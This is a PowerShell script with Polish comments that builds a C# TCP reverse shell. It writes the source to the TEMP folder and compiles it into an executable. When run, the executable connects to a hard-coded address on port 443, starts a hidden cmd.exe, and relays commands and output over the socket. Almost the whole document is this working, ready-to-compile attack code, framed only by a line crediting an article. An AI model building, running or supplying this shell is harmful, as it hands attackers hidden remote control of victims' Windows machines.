# Kompilacja TCP Reverse shell w C# korzystając z PowerShell
# Skrypt inspirowany artykułem: https://www.puckiestyle.nl/c-simple-reverse-shell/

$serverIP = "192.168.1.100"
$serverPort = 443
$code = @"
using System;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Text;

class Program
{
    static void Main()
    {
        string serverIP = "$serverIP";
        int serverPort = $serverPort;

        using (TcpClient client = new TcpClient(serverIP, serverPort))
        using (Stream stream = client.GetStream())
        using (StreamReader reader = new StreamReader(stream))
        using (StreamWriter writer = new StreamWriter(stream))
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            // Przekieruj wyjście procesu do strumienia
            StreamReader processOutput = process.StandardOutput;
            StreamReader processError = process.StandardError;

            // Stwórz dwa wątki do asynchronicznego odczytywania wyjścia i błędów procesu
            AsyncStreamReader(processOutput, writer);
            AsyncStreamReader(processError, writer);

            // Odczytaj polecenia z serwera zdalnego i wykonaj je
            string command;
            while ((command = reader.ReadLine()) != null)
            {
                process.StandardInput.WriteLine(command);
            }

            process.WaitForExit();
        }
    }

    static async void AsyncStreamReader(StreamReader reader, StreamWriter writer)
    {
        char[] buffer = new char[4096];
        int bytesRead;

        try
        {
            while ((bytesRead = await reader.ReadAsync(buffer, 0, buffer.Length)) > 0)
            {
                await writer.WriteAsync(buffer, 0, bytesRead);
                await writer.FlushAsync();
            }
        }
        catch { }
    }
}
"@

# Zapisywanie kodu C# do pliku
$codePath = Join-Path -Path $env:TEMP -ChildPath "ReverseShellCode.cs"
$code | Out-File -FilePath $codePath -Encoding UTF8
$assemblyPath = Join-Path -Path $env:TEMP -ChildPath "ReverseShellCode.exe"

# Parametry kompilacji
$compilerParams = @{
    TypeDefinition = Get-Content -Path $codePath -Raw
    OutputAssembly = $assemblyPath
    ReferencedAssemblies = "System.dll", "System.Net.Sockets.dll", "System.ServiceProcess.dll"
}

# Kompilacja kodu do pliku wykonywalnego (.exe)
Add-Type @compilerParams

Write-Host "Udalo sie skompilowac reverse shell. Plik znajduje sie w $assemblyPath"